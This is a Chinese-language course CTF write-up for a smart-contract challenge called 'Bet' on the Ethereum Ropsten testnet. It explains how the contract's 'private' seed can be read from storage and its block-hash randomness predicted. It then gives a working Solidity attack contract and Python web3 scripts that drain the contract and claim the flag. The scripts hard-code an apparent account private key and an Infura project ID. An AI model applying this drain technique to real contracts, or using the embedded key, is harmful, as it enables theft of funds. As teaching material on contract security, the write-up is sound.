---
tags: 2020 程式安全
---
# HW3
## Bet
### 題目分析
* 一開始要跟BetFactory發送一筆交易去呼叫BetFactory的create()去產生一個新的合約Bet
* Bet合約裡面有個bet()只要輸入的值和Bet合約裡面的getRandom()得到的值相同就能把合約裡面全部的錢拿走
* 當Bet合約裡面的錢都被拿光之後就能夠把server給的token當作參數去發起一筆交易呼叫BetFactory裡面的validate
* 當server發現有一筆成功的交易裡面的token跟一開始給出來的相同就能拿到flag
### 漏洞
* 這題的漏洞主要有兩個部分
    1. 在Bet合約裡面seed的屬性是private但是並不是無法查看只要從節點上找到那個合約就能從那個合約知道seed的值是多少
    2. 亂數產生的方式是用最新產生的那塊block前一塊的hash值跟seed做運算得到的
* 因為seed可以知道再加上我們可以知道呼叫合約當下最新產生那個block前一塊的hash所以這些都拿到後算一下就能算出getRandom()產生的值是多少
* 算出getRandom()產生的值後就能夠把他傳入Bet合約裡面的bet()這樣能夠獲勝把整個合約的錢取走
### Exploit
* 這邊直接部署另外一份HackBet合約讓他去跟BetFactory互動
* 因為BetFactory是根據跟他互動的地址產生一個唯一的Bet合約自己只能跟自己透過create產生的Bet合約互動所以HackBet合約裡面要有create和validate這樣才能由HackBet這個合約來完成create和validate
* 再定義一個run讓他來計算`seed ^ uint(blockhash(block.number - 1))`的值然後傳給Bet合約裡面的bet()就能獲勝而這邊seed等呼叫合約的時候再去節點上看他的值是多少再傳入
* 最後要寫個receive()這樣才能把獲勝之後的錢拿回來不然因為他是合約對合約沒有receive()的話當他執行到`msg.sender.call{value: address(this).balance}("");`的時候會壞掉最後這筆交易會被revert就無法成功
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0;

contract BetFactory
{
    function create() public payable {}
    function validate(uint) public payable {}
}

contract Bet
{
    function bet(uint) public payable {}
    function getRandom() internal returns(uint) {}
}

contract HackBet
{
    address target;
    function create(address _factory) public payable
    {
        BetFactory factory = BetFactory(_factory);
        factory.create{value: msg.value}();
    }
    function validate(address _factory, uint token) public payable
    {
        BetFactory factory = BetFactory(_factory);
        factory.validate(token);
    }
    function run(address _target, uint seed) public payable
    {
        target = _target;
        Bet instance = Bet(target);
        uint rand = seed ^ uint(blockhash(block.number - 1));
        instance.bet{value: msg.value}(rand);
    }
    receive () external payable 
    {
        Bet instance = Bet(target);
        if(address(instance).balance > 0)
        {
            msg.sender.call{value: address(this).balance}("");   
        }
    }
}
```
* 一開始先看HackBet的地址有沒有在BetFactory那邊create過如果有create過那instance的值就不會是0x0000000000000000000000000000000000000000
* 如果沒有create過就發起一筆交易用HackBet裡面的create去跟BetFactory產生一個Bet合約這邊create的這筆交易必須要有eth不然會失敗所以這個交易的value給他0.5eth
* 然後就等他交易成功上鏈之後就會產生一個Bet合約這時候就可以來跟這個Bet合約互動來玩裡面的bet()
* 因為他在算隨機值的時候會用到private的seed所以我們就可以直接到節點上找到這份Bet合約然後用getStorageAt把seed的值讀出來因為0的位置是存產生這份Bet合約的地址1才是seed所以要讀1裡面的值
* 找出seed之後就可以再發起一筆交易把它傳給HackBet的run然後讓他把隨機值算出來然後傳給Bet的bet()這樣就能夠獲勝把Bet合約裡面的錢贏走
```python=
import json
from time import sleep
from web3 import Web3, HTTPProvider

w3 = Web3(HTTPProvider('https://ropsten.infura.io/v3/15253aad1d464c0ea37c6a342fe0e1b3'))
account = w3.toChecksumAddress('0xf75ad09Aea6569e0d54Ccde65b655A598e9b66E4')
w3.eth.defaultAccount = account
privateKey = bytes.fromhex('40a8d082c7e38882d20e7bf174d3a9ea246c82073c7f7f061f4f6bb78bfdbf55')
factoryAddr = w3.toChecksumAddress('0x8e0a809B1f413deB6427535cC53383954DBF8329')
factory = w3.eth.contract(address=factoryAddr, abi=json.loads(open('./BetFactory.abi').read()))
hackAddr = w3.toChecksumAddress('0x27d967Ff06498d2Ac8A0726A16863AD743d1447d')
hack = w3.eth.contract(address=hackAddr, abi=json.loads(open('./HackBet.abi').read()))

instancesAddr = factory.functions.instances(hackAddr).call()
if instancesAddr == '0x0000000000000000000000000000000000000000':
    tx = hack.functions.create(factoryAddr).buildTransaction({
        'nonce': w3.eth.getTransactionCount(account),
        'gas': 300000,
        'gasPrice': w3.toWei(1000, 'Gwei'),
        'value': w3.toWei(0.5, 'ether')
    })
    signTx = w3.eth.account.signTransaction(tx, private_key=privateKey)
    txHash = w3.eth.sendRawTransaction(signTx.rawTransaction)
    print('transaction -> https://ropsten.etherscan.io/tx/' + hex(int.from_bytes(txHash, 'big')))
    counter = 0
    while 1:
        sleep(1)
        instancesAddr = factory.functions.instances(hackAddr).call()
        if instancesAddr != '0x0000000000000000000000000000000000000000':
            break
        counter += 1
        if counter > 300:
            print('wait too long...')
            exit(0)
print(f'instances = {instancesAddr}')
instances = w3.eth.contract(address=instancesAddr, abi=json.loads(open('./Bet.abi').read()))
seed = int.from_bytes(w3.eth.getStorageAt(account=instancesAddr, position=1), 'big')
tx = hack.functions.run(instancesAddr, seed).buildTransaction({
    'nonce': w3.eth.getTransactionCount(account),
    'gas': 300000,
    'gasPrice': w3.toWei(1000, 'Gwei'),
    'value': w3.toWei(0.1, 'ether')
})
signTx = w3.eth.account.signTransaction(tx, private_key=privateKey)
txHash = w3.eth.sendRawTransaction(signTx.rawTransaction)
print('transaction -> https://ropsten.etherscan.io/tx/' + hex(int.from_bytes(txHash, 'big')))
```
* 當Bet合約裡面沒錢之後就可以去發起一筆交易去呼叫validate並把token傳進去這樣就能拿到flag了
```python=
from web3 import Web3, HTTPProvider
import json

w3 = Web3(HTTPProvider('https://ropsten.infura.io/v3/15253aad1d464c0ea37c6a342fe0e1b3'))
account = w3.toChecksumAddress('0xf75ad09Aea6569e0d54Ccde65b655A598e9b66E4')
w3.eth.defaultAccount = account
privateKey = bytes.fromhex('40a8d082c7e38882d20e7bf174d3a9ea246c82073c7f7f061f4f6bb78bfdbf55')
factoryAddr = w3.toChecksumAddress('0x8e0a809B1f413deB6427535cC53383954DBF8329')
hackAddr = w3.toChecksumAddress('0x27d967Ff06498d2Ac8A0726A16863AD743d1447d')
hack = w3.eth.contract(address=hackAddr, abi=json.loads(open('./HackBet.abi').read()))

tx = hack.functions.validate(factoryAddr, 0xcaa003cb2c8feffc6716206682926a5cdeb73f7fa26d8f2f2fc0686d89d513d5).buildTransaction({
    'nonce': w3.eth.getTransactionCount(account),
    'gas': 300000,
    'gasPrice': w3.toWei(1000, 'Gwei')
})
signTx = w3.eth.account.signTransaction(tx, private_key=privateKey)
txHash = w3.eth.sendRawTransaction(signTx.rawTransaction)
print('transaction -> https://ropsten.etherscan.io/tx/' + hex(int.from_bytes(txHash, 'big')))
```
### FLAG
>FLAG{CgMZBaRrk4tY1xnnEdDi}